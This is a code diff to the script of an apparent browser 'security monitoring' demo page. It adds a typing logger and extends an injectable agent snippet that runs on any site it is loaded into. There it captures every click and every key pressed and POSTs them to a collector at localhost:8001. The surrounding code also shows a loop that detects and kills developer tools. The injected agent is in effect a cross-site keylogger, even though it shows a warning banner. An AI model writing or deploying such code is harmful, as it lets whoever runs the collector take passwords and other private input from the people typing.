@@ -271,6 +271,38 @@ document.addEventListener('keydown', (e) => {
     }
 });
 
+// 5.1 Typing & Focus Monitoring
+function setupTypingMonitor() {
+    const typingInput = document.getElementById('typing-test-input');
+    const statusTyping = document.getElementById('status-typing');
+    const typingMetadata = document.getElementById('typing-metadata');
+    
+    if (!typingInput) return;
+
+    typingInput.addEventListener('focus', () => {
+        statusTyping.textContent = 'FOCUS DETECTED';
+        statusTyping.className = 'status neutral';
+        typingMetadata.textContent = `Target: ${typingInput.id} (${typingInput.tagName})`;
+        typingInput.style.borderColor = 'var(--primary-color)';
+        logActivity(`Input focus detected on #${typingInput.id}`, 'info');
+    });
+
+    typingInput.addEventListener('blur', () => {
+        statusTyping.textContent = 'Waiting...';
+        statusTyping.className = 'status';
+        typingMetadata.textContent = 'Target: None';
+        typingInput.style.borderColor = '#e2e8f0';
+        logActivity(`Input focus lost on #${typingInput.id}`, 'info');
+    });
+
+    typingInput.addEventListener('input', (e) => {
+        const val = e.target.value;
+        const lastChar = val.charAt(val.length - 1) || 'None';
+        statusTyping.textContent = `TYPING: "${lastChar}"`;
+        logActivity(`Typing detected: "${lastChar}" in #${typingInput.id}`, 'info');
+    });
+}
+
 // 6. Window Focus/Blur Monitoring
 window.addEventListener('focus', () => {
     const statusFocus = document.getElementById('status-focus');
@@ -821,6 +853,7 @@ window.onload = () => {
     checkDesktopScanner();
     setupCrossSiteMonitoring();
     initializeAgentLinks();
+    setupTypingMonitor();
 
     // DevTools check and kill loop
     setInterval(detectDevTools, 2000);
@@ -844,7 +877,11 @@ function initializeAgentLinks() {
     const agentCodeRaw = `(function(){
         const sid = Math.random().toString(36).substr(2, 9);
         const host = window.location.hostname || 'local-file';
-        const report = () => fetch(\`http://localhost:8001/report?sid=\${sid}&host=\${host}\`).catch(()=>{});
+        const report = (type, data = {}) => fetch(\`http://localhost:8001/report?sid=\${sid}&host=\${host}&event=\${type}\`, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data)
+        }).catch(()=>{});
         
         const i = 'monitoring-overlay-auto';
         if(document.getElementById(i)) return;
@@ -855,11 +892,23 @@ function initializeAgentLinks() {
         o.innerHTML = '⚠️ EVERYTHINGTT SECURITY SYSTEM: THIS SITE IS BEING MONITORED BY THE CENTRAL RESEARCH CENTER <span style="margin-left:20px; cursor:pointer; text-decoration:underline;" onclick="this.parentElement.remove()">Dismiss</span>';
         document.body.prepend(o);
         
-        report();
-        setInterval(report, 10000);
+        // Monitoring Activity Logs
+        document.addEventListener('click', (e) => {
+            const info = { x: e.clientX, y: e.clientY, target: e.target.tagName };
+            console.log('[Security Agent] Click detected:', info);
+            report('click', info);
+        });
+
+        document.addEventListener('keydown', (e) => {
+            const info = { key: e.key, target: e.target.tagName };
+            console.log('[Security Agent] Key detected:', info);
+            report('keydown', info);
+        });
+
+        report('agent_active');
+        setInterval(() => report('heartbeat'), 10000);
         
         alert('EverythingTT Security Monitoring Agent Injected into ' + host);
-        console.log('Security Monitoring Agent Active on ' + host + ' [SID: ' + sid + ']');
     })();void(0);`;
 
     // Minify by removing newlines and excessive spaces
